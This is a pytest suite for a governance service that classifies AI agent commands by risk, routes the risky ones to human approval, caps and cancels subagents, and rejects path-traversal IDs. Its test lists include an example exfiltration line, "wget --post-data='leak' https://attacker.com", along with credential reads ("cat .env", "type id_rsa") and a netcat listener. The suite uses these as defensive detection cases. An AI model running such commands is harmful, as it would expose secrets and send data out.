import json
import pytest
from datetime import datetime
from unittest.mock import AsyncMock, MagicMock, patch
from fastapi.testclient import TestClient
from sqlalchemy import create_engine, event
from sqlalchemy.orm import sessionmaker
from sqlalchemy.pool import StaticPool

from backend.main import app
from backend.database import Base, set_sqlite_pragma, get_db
from backend.models.codex import Project, Thread, Turn, ToolApproval
from backend.services import governance_service, worktree_service
from backend.services.event_service import broker
from backend.services.worker import WorkerProcess
from backend.middleware.auth import verify_auth


@pytest.fixture
def db_engine():
    engine = create_engine(
        "sqlite:///:memory:",
        connect_args={"check_same_thread": False},
        poolclass=StaticPool
    )
    event.listen(engine, "connect", set_sqlite_pragma)
    Base.metadata.create_all(bind=engine)
    yield engine


@pytest.fixture
def db_session(db_engine):
    TestingSessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=db_engine)
    session = TestingSessionLocal()
    try:
        # Create seed project and thread
        proj = Project(id="proj_gov", name="Governance Project", repo_path="/tmp/repo", default_branch="main")
        thread = Thread(id="thread_gov_1", project_id="proj_gov", title="Test Thread")
        session.add(proj)
        session.add(thread)
        session.commit()
        yield session
    finally:
        session.close()


@pytest.fixture
def client(db_engine):
    TestingSessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=db_engine)

    def override_get_db():
        db = TestingSessionLocal()
        try:
            yield db
        finally:
            db.close()

    app.dependency_overrides[get_db] = override_get_db
    app.dependency_overrides[verify_auth] = lambda: "test_token"

    yield TestClient(app)
    app.dependency_overrides.clear()


# =============================================================
# Test 1: Tool Risk Evaluation assigns correct risk levels
# =============================================================
def test_tool_risk_evaluation_tiers():
    """
    Test 1: Tool risk evaluation assigns correct risk levels (LOW, MEDIUM, HIGH, CRITICAL).
    """
    # LOW risk evaluation
    low_cmds = [
        "git status",
        "git diff HEAD~1",
        "git log -n 5",
        "cat README.md",
        "grep 'def main' backend/main.py",
        "find . -name '*.py'",
        "ls -la /workspace",
        "pwd"
    ]
    for cmd in low_cmds:
        risk, req_appr, consequence = governance_service.evaluate_tool_risk(cmd, profile="managed")
        assert risk == governance_service.RISK_LOW, f"Expected LOW for '{cmd}', got {risk}"
        assert req_appr is False, f"Expected no approval for '{cmd}' in managed profile"

    # LOW risk tools
    low_tools = ["view_file", "list_dir", "grep_search", "find_by_name", "read_url_content"]
    for t in low_tools:
        risk, req_appr, _ = governance_service.evaluate_tool_risk("", tool_name=t, profile="managed")
        assert risk == governance_service.RISK_LOW, f"Expected LOW for tool '{t}', got {risk}"
        assert req_appr is False

    # MEDIUM risk evaluation
    medium_cmds = [
        "git add backend/main.py",
        "git commit -m 'feat: add governance'",
        "touch new_feature.py",
        "mkdir -p src/components",
        "cp config.example.json config.json",
        "echo 'data' > output.txt"
    ]
    for cmd in medium_cmds:
        risk, req_appr_managed, _ = governance_service.evaluate_tool_risk(cmd, profile="managed")
        _, req_appr_strict, _ = governance_service.evaluate_tool_risk(cmd, profile="strict")
        assert risk == governance_service.RISK_MEDIUM, f"Expected MEDIUM for '{cmd}', got {risk}"
        assert req_appr_managed is False, f"Expected auto-approved in managed profile for '{cmd}'"
        assert req_appr_strict is True, f"Expected approval required in strict profile for '{cmd}'"

    # MEDIUM risk tools
    medium_tools = ["write_to_file", "replace_file_content", "edit_file", "create_file"]
    for t in medium_tools:
        risk, req_appr_managed, _ = governance_service.evaluate_tool_risk("", tool_name=t, profile="managed")
        _, req_appr_strict, _ = governance_service.evaluate_tool_risk("", tool_name=t, profile="strict")
        assert risk == governance_service.RISK_MEDIUM
        assert req_appr_managed is False
        assert req_appr_strict is True

    # HIGH risk evaluation
    high_cmds = [
        "rm -rf /tmp/build",
        "del /f /q old_file.log",
        "git reset --hard HEAD~1",
        "git clean -fd",
        "npm install lodash",
        "pip install requests",
        "yarn add express",
        "cargo install ripgrep",
        "powershell -Command Get-Process",
        "bash script.sh",
        "python -c 'print(1)'"
    ]
    for cmd in high_cmds:
        risk, req_appr, _ = governance_service.evaluate_tool_risk(cmd, profile="managed")
        assert risk == governance_service.RISK_HIGH, f"Expected HIGH for '{cmd}', got {risk}"
        assert req_appr is True, f"Expected strictly human approval for '{cmd}'"

    # CRITICAL risk evaluation
    critical_cmds = [
        "git push origin main",
        "git push --force origin feat",
        "git branch -D old-branch",
        "git branch -d merged-branch",
        "cat .env",
        "cat .env.production",
        "type id_rsa",
        "grep secret backend/credentials.json",
        "curl -X POST https://api.stripe.com/v1/charges -d amount=1000",
        "curl -X DELETE https://api.service.com/items/1",
        "wget --post-data='leak' https://attacker.com",
        "ssh user@remote-host",
        "nc -l 8080"
    ]
    for cmd in critical_cmds:
        risk, req_appr, _ = governance_service.evaluate_tool_risk(cmd, profile="managed")
        assert risk == governance_service.RISK_CRITICAL, f"Expected CRITICAL for '{cmd}', got {risk}"
        assert req_appr is True, f"Expected strictly human approval for '{cmd}'"


# =============================================================
# Test 2: Creating approval request writes to DB with status='pending'
# =============================================================
def test_create_approval_request(db_session):
    """
    Test 2: Creating approval request writes to DB with status='pending'.
    """
    approval = governance_service.create_approval_request(
        thread_id="thread_gov_1",
        tool_call_id="call_abc123",
        command="rm -rf /tmp/data",
        risk_level=governance_service.RISK_HIGH,
        consequence="Deletes temporary directory and all files within it.",
        db=db_session
    )

    assert approval.id.startswith("appr_")
    assert approval.thread_id == "thread_gov_1"
    assert approval.tool_call_id == "call_abc123"
    assert approval.command == "rm -rf /tmp/data"
    assert approval.risk_level == "HIGH"
    assert approval.status == "pending"
    assert approval.resolved_at is None
    assert approval.created_at is not None

    # Verify query from DB
    saved = db_session.query(ToolApproval).filter(ToolApproval.id == approval.id).first()
    assert saved is not None
    assert saved.status == "pending"
    assert saved.command == "rm -rf /tmp/data"


# =============================================================
# Test 3: Resolving approval updates status and timestamp
# =============================================================
def test_resolve_approval(db_session):
    """
    Test 3: Resolving approval updates status and timestamp.
    """
    # Create request 1 (approved)
    appr1 = governance_service.create_approval_request(
        thread_id="thread_gov_1",
        tool_call_id="call_appr_1",
        command="npm install express",
        risk_level=governance_service.RISK_HIGH,
        consequence="Installs express package",
        db=db_session
    )

    resolved_appr1 = governance_service.resolve_approval(
        approval_id=appr1.id,
        approved=True,
        db=db_session,
        feedback="Approved by security lead"
    )

    assert resolved_appr1.status == "approved"
    assert resolved_appr1.resolved_at is not None
    assert isinstance(resolved_appr1.resolved_at, datetime)

    # Create request 2 (declined)
    appr2 = governance_service.create_approval_request(
        thread_id="thread_gov_1",
        tool_call_id="call_appr_2",
        command="git push origin main --force",
        risk_level=governance_service.RISK_CRITICAL,
        consequence="Force pushes to main branch",
        db=db_session
    )

    resolved_appr2 = governance_service.resolve_approval(
        approval_id=appr2.id,
        approved=False,
        db=db_session,
        feedback="Force push to main is prohibited"
    )

    assert resolved_appr2.status == "declined"
    assert resolved_appr2.resolved_at is not None

    # Resolving non-existent approval raises ValueError
    with pytest.raises(ValueError, match="not found"):
        governance_service.resolve_approval("appr_nonexistent", True, db_session)


# =============================================================
# Test 4: Registering subagents respects concurrency limit (6)
# =============================================================
def test_subagent_concurrency_limiting(db_session):
    """
    Test 4: Registering subagents respects concurrency limit (rejects 7th concurrent subagent with error).
    """
    thread_id = "thread_gov_1"
    subagents = []

    # Register 6 concurrent active subagents
    for i in range(1, 7):
        sub = governance_service.register_subagent(
            thread_id=thread_id,
            parent_thread_id=None,
            name=f"Worker-{i}",
            role=f"Role-{i}",
            db=db_session
        )
        assert sub.status == "active"
        subagents.append(sub)

    # Attempting to register the 7th active subagent must fail
    with pytest.raises(ValueError, match="Maximum active subagent concurrency reached \\(6\\)"):
        governance_service.register_subagent(
            thread_id=thread_id,
            parent_thread_id=None,
            name="Worker-7",
            role="Role-7",
            db=db_session
        )

    # If one subagent completes or is stopped, registering another succeeds
    governance_service.update_subagent_progress(
        subagent_id=subagents[0].id,
        progress=100,
        current_action="Finished task",
        status="completed",
        db=db_session
    )

    sub7 = governance_service.register_subagent(
        thread_id=thread_id,
        parent_thread_id=None,
        name="Worker-7",
        role="Role-7",
        db=db_session
    )
    assert sub7.id is not None
    assert sub7.status == "active"


# =============================================================
# Test 5: Cascade cancellation terminates all child subagents
# =============================================================
def test_cascade_cancellation(db_session):
    """
    Test 5: Cascade cancellation terminates all child subagents when parent thread is cancelled.
    """
    thread_id = "thread_gov_1"

    # Register 3 active subagents
    sub1 = governance_service.register_subagent(
        thread_id=thread_id,
        parent_thread_id=None,
        name="Architect",
        role="Planning",
        db=db_session
    )
    sub2 = governance_service.register_subagent(
        thread_id=thread_id,
        parent_thread_id=None,
        name="Coder",
        role="Implementation",
        db=db_session
    )
    # Create child thread for subagent in child thread
    child_thread = Thread(id="child_thread_1", project_id="proj_gov", title="Child Thread 1")
    db_session.add(child_thread)
    db_session.commit()

    sub3 = governance_service.register_subagent(
        thread_id="child_thread_1",
        parent_thread_id=thread_id,
        name="Tester",
        role="QA",
        db=db_session
    )

    # 1 subagent is already completed before cancellation
    sub4 = governance_service.register_subagent(
        thread_id=thread_id,
        parent_thread_id=None,
        name="Researcher",
        role="Research",
        db=db_session
    )
    governance_service.update_subagent_progress(
        subagent_id=sub4.id,
        progress=100,
        current_action="Complete",
        status="completed",
        db=db_session
    )

    # Perform cascade termination
    terminated = governance_service.terminate_subagents_for_thread(thread_id, db_session)
    terminated_ids = {s.id for s in terminated}

    assert sub1.id in terminated_ids
    assert sub2.id in terminated_ids
    assert sub3.id in terminated_ids
    assert sub4.id not in terminated_ids  # completed agent is not re-cancelled

    # Check status in DB
    db_session.refresh(sub1)
    db_session.refresh(sub2)
    db_session.refresh(sub3)
    db_session.refresh(sub4)

    assert sub1.status == "cancelled"
    assert sub2.status == "cancelled"
    assert sub3.status == "cancelled"
    assert sub4.status == "completed"


# =============================================================
# Test 6: API endpoints for approvals and subagents
# =============================================================
def test_governance_api_endpoints(client, db_session):
    """
    Test 6: API endpoints create, list, resolve approvals and steer/stop subagents.
    """
    # 1. Create approval via API
    res = client.post("/codex/governance/approvals", json={
        "thread_id": "thread_gov_1",
        "tool_call_id": "api_call_1",
        "command": "git reset --hard HEAD",
        "risk_level": "HIGH",
        "consequence": "Discards all uncommitted changes"
    })
    assert res.status_code == 200
    approval_id = res.json()["id"]
    assert res.json()["status"] == "pending"

    # 2. List pending approvals
    res = client.get("/codex/governance/approvals/pending?thread_id=thread_gov_1")
    assert res.status_code == 200
    pending = res.json()
    assert len(pending) >= 1
    assert any(a["id"] == approval_id for a in pending)

    # 3. Resolve approval via API
    res = client.post(f"/codex/governance/approvals/{approval_id}/resolve", json={
        "approved": True,
        "feedback": "Approved for rollback"
    })
    assert res.status_code == 200
    assert res.json()["status"] == "approved"
    assert res.json()["resolved_at"] is not None

    # Verify it is no longer in pending
    res = client.get("/codex/governance/approvals/pending?thread_id=thread_gov_1")
    assert res.status_code == 200
    assert not any(a["id"] == approval_id for a in res.json())

    # 4. Register subagent via API
    res = client.post("/codex/governance/subagents/register", json={
        "thread_id": "thread_gov_1",
        "name": "API-Worker",
        "role": "Refactor"
    })
    assert res.status_code == 200
    subagent_id = res.json()["id"]
    assert res.json()["name"] == "API-Worker"
    assert res.json()["status"] == "active"

    # 5. List subagents for thread
    res = client.get("/codex/governance/subagents/thread_gov_1")
    assert res.status_code == 200
    subagents = res.json()
    assert any(s["id"] == subagent_id for s in subagents)

    # 6. Steer subagent via API
    res = client.post(f"/codex/governance/subagents/{subagent_id}/steer", json={
        "instruction": "Focus only on tests"
    })
    assert res.status_code == 200
    assert res.json()["status"] == "steered"

    # 7. Update subagent progress via API
    res = client.post(f"/codex/governance/subagents/{subagent_id}/progress", json={
        "progress": 50,
        "current_action": "Writing unit tests",
        "status": "active"
    })
    assert res.status_code == 200
    assert res.json()["progress"] == 50
    assert res.json()["current_action"] == "Writing unit tests"

    # 8. Stop subagent via API
    res = client.post(f"/codex/governance/subagents/{subagent_id}/stop")
    assert res.status_code == 200
    assert res.json()["status"] == "stopped"

    # 9. Evaluate Risk Endpoint
    res = client.post("/codex/governance/evaluate", json={
        "command": "cat .env",
        "profile": "managed"
    })
    assert res.status_code == 200
    assert res.json()["risk_level"] == "CRITICAL"
    assert res.json()["requires_approval"] is True


# =============================================================
# Test 7: Authentication Protection on Governance Endpoints
# =============================================================
def test_governance_auth_enforcement(db_engine):
    """
    Test 7: Governance endpoints reject unauthenticated requests when auth is enabled.
    """
    TestingSessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=db_engine)

    def override_get_db():
        db = TestingSessionLocal()
        try:
            yield db
        finally:
            db.close()

    app.dependency_overrides[get_db] = override_get_db
    # Do NOT override verify_auth -> test actual auth logic
    if verify_auth in app.dependency_overrides:
        del app.dependency_overrides[verify_auth]

    unauthed_client = TestClient(app)

    # Without token -> 401
    res = unauthed_client.get("/codex/governance/approvals/pending")
    assert res.status_code == 401

    res = unauthed_client.get("/codex/governance/subagents/thread_1")
    assert res.status_code == 401

    app.dependency_overrides.clear()


# =============================================================
# Test 8: Worktree Sandbox Path Binding and Traversal Safety
# =============================================================
def test_worktree_sandbox_binding_and_path_safety(tmp_path):
    """
    Test 8: Ensure thread worktree is strictly bound to worktrees/wt-<threadId>
    and traversal attempts are rejected.
    """
    repo_dir = tmp_path / "test_repo"
    repo_dir.mkdir()

    # 1. Successful worktree creation under isolated path
    thread_id = "thread_alpha_99"
    wt_path = worktree_service.ensure_thread_worktree(str(repo_dir), thread_id)
    assert wt_path == repo_dir / "worktrees" / f"wt-{thread_id}"
    assert wt_path.exists()
    assert wt_path.is_dir()

    # 2. Idempotent check
    wt_path_2 = worktree_service.ensure_thread_worktree(str(repo_dir), thread_id)
    assert wt_path_2 == wt_path

    # 3. Path traversal attack attempt in thread_id must be rejected
    traversal_ids = ["../escaped", "foo/../../bar", "sub\\folder", "etc/passwd"]
    for bad_id in traversal_ids:
        with pytest.raises(ValueError, match="Invalid worktree name"):
            worktree_service.ensure_thread_worktree(str(repo_dir), bad_id)


# =============================================================
# Test 9: Turn Start Binds Worktree Sandbox to WorkspaceRoot and CWD
# =============================================================
def test_turn_start_binds_worktree_sandbox(client, db_session):
    """
    Test 9: Starting a turn configures workspaceRoot strictly to the thread's isolated worktree.
    """
    with patch("backend.services.worker_manager.worker_manager.get_worker_for_thread") as mock_get_worker:
        mock_worker = AsyncMock()
        mock_worker.running = True
        mock_worker.send_request = AsyncMock()
        mock_get_worker.return_value = mock_worker

        res = client.post("/codex/turns/start", json={
            "thread_id": "thread_gov_1",
            "prompt": "Create test module"
        })
        assert res.status_code == 200
        data = res.json()
        assert data["status"] == "active"
        assert "workspace_root" in data
        assert "worktrees" in data["workspace_root"]
        assert "wt-thread_gov_1" in data["workspace_root"]

        # Verify get_worker_for_thread was called with thread_gov_1
        mock_get_worker.assert_called_once()
        args, kwargs = mock_get_worker.call_args
        assert args[0] == "thread_gov_1"

        # Verify turn/start request was queued with workspaceRoot
        mock_worker.send_request.assert_called_once()
        call_method, call_params = mock_worker.send_request.call_args[0]
        assert call_method == "turn/start"
        assert call_params["threadId"] == "thread_gov_1"
        assert "workspaceRoot" in call_params
        assert "wt-thread_gov_1" in call_params["workspaceRoot"]


# =============================================================
# Test 10: Tool Approval Interception Auto-Approves LOW Risk
# =============================================================
@pytest.mark.asyncio
async def test_tool_approval_interception_auto_approve_low_risk(db_session):
    """
    Test 10: Codex App-Server notification for LOW risk tool call is automatically approved
    and dispatches JSON-RPC response back immediately.
    """
    worker = WorkerProcess(command=["mock"], perform_handshake=False)
    worker.thread_id = "thread_gov_1"
    worker.send_raw = AsyncMock()

    low_msg = {
        "jsonrpc": "2.0",
        "id": "req_low_123",
        "method": "turn/toolApprovalRequested",
        "params": {
            "threadId": "thread_gov_1",
            "toolCallId": "tc_status_01",
            "command": "git status"
        }
    }

    with patch("backend.services.worker.SessionLocal", return_value=db_session):
        await worker._handle_tool_approval(low_msg)

    # Worker sent JSON-RPC response with approved=True
    worker.send_raw.assert_called_once()
    raw_call = worker.send_raw.call_args[0][0]
    res_data = json.loads(raw_call)
    assert res_data["jsonrpc"] == "2.0"
    assert res_data["id"] == "req_low_123"
    assert res_data["result"]["approved"] is True

    # No pending approval in database
    pending = governance_service.list_pending_approvals(db_session, "thread_gov_1")
    assert len(pending) == 0


# =============================================================
# Test 11: Tool Approval Interception Pauses HIGH and CRITICAL Risk
# =============================================================
@pytest.mark.asyncio
async def test_tool_approval_interception_pauses_high_and_critical_risk(db_session):
    """
    Test 11: HIGH and CRITICAL risk commands pause execution, persist pending ToolApproval,
    and broadcast approval_requested event envelope.
    """
    worker = WorkerProcess(command=["mock"], perform_handshake=False)
    worker.thread_id = "thread_gov_1"
    worker.send_raw = AsyncMock()

    high_msg = {
        "jsonrpc": "2.0",
        "id": "req_high_456",
        "method": "turn/toolApprovalRequested",
        "params": {
            "threadId": "thread_gov_1",
            "toolCallId": "tc_install_456",
            "command": "npm install lodash"
        }
    }

    with patch("backend.services.worker.SessionLocal", return_value=db_session):
        await worker._handle_tool_approval(high_msg)

    # Worker was NOT auto-approved
    worker.send_raw.assert_not_called()

    # DB record created with status='pending'
    pending = governance_service.list_pending_approvals(db_session, "thread_gov_1")
    assert len(pending) == 1
    approval = pending[0]
    assert approval.tool_call_id == "tc_install_456"
    assert approval.risk_level == "HIGH"
    assert approval.status == "pending"
    assert approval.resolved_at is None

    # Broker event was published with approval_requested
    events = broker.get_history("thread_gov_1")
    assert any(e.type == "approval_requested" and e.payload["tool_call_id"] == "tc_install_456" for e in events)

    # Pending RPC registry tracked the request ID and worker
    rpc_entry = governance_service.get_pending_rpc(approval.id)
    assert rpc_entry is not None
    assert rpc_entry["resp_id"] == "req_high_456"
    assert rpc_entry["worker"] == worker


# =============================================================
# Test 12: Approval Resolution Dispatches JSON-RPC Response to Worker
# =============================================================
def test_approval_resolution_dispatches_jsonrpc_response(db_session):
    """
    Test 12: Resolving approval updates DB, broadcasts event, and dispatches JSON-RPC response.
    """
    # Create approval
    appr = governance_service.create_approval_request(
        thread_id="thread_gov_1",
        tool_call_id="tc_res_789",
        command="rm -rf dist",
        risk_level="HIGH",
        consequence="Deletes build dist folder",
        db=db_session
    )

    mock_worker = MagicMock()
    mock_worker.send_raw = AsyncMock()

    # Register pending RPC
    governance_service.register_pending_rpc(
        tool_call_id=appr.tool_call_id,
        resp_id="resp_rpc_789",
        worker=mock_worker,
        approval_id=appr.id
    )

    # Resolve approval
    resolved = governance_service.resolve_approval(
        approval_id=appr.id,
        approved=True,
        db=db_session,
        feedback="Safe to purge dist"
    )

    assert resolved.status == "approved"
    assert resolved.resolved_at is not None

    # Worker received JSON-RPC response
    mock_worker.send_raw.assert_called_once()
    raw_str = mock_worker.send_raw.call_args[0][0]
    payload = json.loads(raw_str)
    assert payload["jsonrpc"] == "2.0"
    assert payload["id"] == "resp_rpc_789"
    assert payload["result"]["approved"] is True
    assert payload["result"]["feedback"] == "Safe to purge dist"

    # Pending RPC was popped
    assert governance_service.get_pending_rpc(appr.id) is None


# =============================================================
# Test 13: Turn Interrupt Cascades Cancellation to Pending Approvals
# =============================================================
def test_turn_interrupt_cascade_cancels_pending_approvals(client, db_session):
    """
    Test 13: When a turn is interrupted, all pending approvals for that thread are automatically cancelled.
    """
    # Create turn
    turn = Turn(id=101, thread_id="thread_gov_1", turn_number=1, status="active")
    db_session.add(turn)

    # Create 2 pending approvals
    appr1 = governance_service.create_approval_request(
        thread_id="thread_gov_1",
        tool_call_id="tc_cancel_1",
        command="git reset --hard",
        risk_level="HIGH",
        consequence="Discard changes",
        db=db_session
    )
    appr2 = governance_service.create_approval_request(
        thread_id="thread_gov_1",
        tool_call_id="tc_cancel_2",
        command="git push origin main",
        risk_level="CRITICAL",
        consequence="Push to main",
        db=db_session
    )
    assert len(governance_service.list_pending_approvals(db_session, "thread_gov_1")) == 2

    # Interrupt turn via API
    with patch("backend.services.worker_manager.worker_manager.get_worker") as mock_gw:
        mock_w = AsyncMock()
        mock_w.send_request = AsyncMock()
        mock_gw.return_value = mock_w

        res = client.post("/codex/turns/interrupt", json={
            "thread_id": "thread_gov_1",
            "turn_id": 101
        })
        assert res.status_code == 200
        assert res.json()["status"] == "interrupted"

    # Verify both approvals are cancelled
    db_session.refresh(appr1)
    db_session.refresh(appr2)
    assert appr1.status == "cancelled"
    assert appr1.resolved_at is not None
    assert appr2.status == "cancelled"
    assert appr2.resolved_at is not None

    # No pending approvals remain
    assert len(governance_service.list_pending_approvals(db_session, "thread_gov_1")) == 0

    # Events were published
    events = broker.get_history("thread_gov_1")
    assert any(e.type == "approval_cancelled" and e.payload["approval_id"] == appr1.id for e in events)
    assert any(e.type == "approval_cancelled" and e.payload["approval_id"] == appr2.id for e in events)


# =============================================================
# Test 14: Approvals Respond Endpoint Integration
# =============================================================
def test_approvals_respond_endpoint_integration(client, db_session):
    """
    Test 14: Operator responds via POST /codex/approvals/respond, resolving DB and notifying worker.
    """
    appr = governance_service.create_approval_request(
        thread_id="thread_gov_1",
        tool_call_id="tc_respond_01",
        command="del sensitive.db",
        risk_level="HIGH",
        consequence="Deletes sensitive db file",
        db=db_session
    )

    mock_worker = MagicMock()
    mock_worker.running = True
    mock_worker.send_raw = AsyncMock()
    mock_worker.send_request = AsyncMock()

    governance_service.register_pending_rpc(
        tool_call_id=appr.tool_call_id,
        resp_id="resp_rpc_respond",
        worker=mock_worker,
        approval_id=appr.id
    )

    with patch("backend.services.worker_manager.worker_manager.get_worker", return_value=mock_worker):
        res = client.post("/codex/approvals/respond", json={
            "tool_call_id": "tc_respond_01",
            "approved": True,
            "feedback": "Confirmed deletion"
        })
        assert res.status_code == 200
        assert res.json()["status"] == "approved"
        assert res.json()["tool_call_id"] == "tc_respond_01"

    # DB record resolved
    db_session.refresh(appr)
    assert appr.status == "approved"
    assert appr.resolved_at is not None

    # Worker received JSON-RPC response
    mock_worker.send_raw.assert_called_once()
    payload = json.loads(mock_worker.send_raw.call_args[0][0])
    assert payload["id"] == "resp_rpc_respond"
    assert payload["result"]["approved"] is True
